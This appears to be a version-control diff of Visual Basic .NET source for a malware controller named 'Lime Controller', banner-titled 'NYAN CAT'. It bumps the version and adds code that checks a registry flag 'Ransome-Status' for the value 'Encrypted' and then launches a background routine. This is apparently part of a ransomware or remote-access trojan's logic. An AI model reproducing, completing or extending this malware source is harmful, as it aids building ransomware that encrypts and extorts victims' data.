@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##           N Y A N   C A T  ||  Last edit FEB/26/2018         ##
+'##           N Y A N   C A T  ||  Last edit MAR./08/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                  .. Lime Controller v0.3 ..                  ##
+'##                  .. Lime Controller v0.3.1 ..                ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -50,6 +50,13 @@ Namespace Lime
             Dim T As New Threading.Thread(New Threading.ThreadStart(AddressOf SK.rc), 1)
             T.Start()
 
+            Try
+                If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", Nothing) = "Encrypted" Then
+                    Dim T2 As New Threading.Thread(AddressOf MISC.Proc)
+                    T2.Start()
+                End If
+            Catch
+            End Try
 
 
 
